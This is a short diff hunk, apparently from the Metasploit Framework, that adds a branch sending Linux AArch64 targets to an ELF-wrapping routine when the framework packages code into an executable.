@@ -165,6 +165,14 @@ require 'msf/core/exe/segment_appender'
       # XXX: Add remaining ARMLE systems here
     end
 
+    if arch.index(ARCH_AARCH64)
+      if plat.index(Msf::Module::Platform::Linux)
+        return to_linux_aarch64_elf(framework, code)
+      end
+
+      # XXX: Add remaining AARCH64 systems here
+    end
+
     if arch.index(ARCH_PPC)
       if plat.index(Msf::Module::Platform::OSX)
         return to_osx_ppc_macho(framework, code)
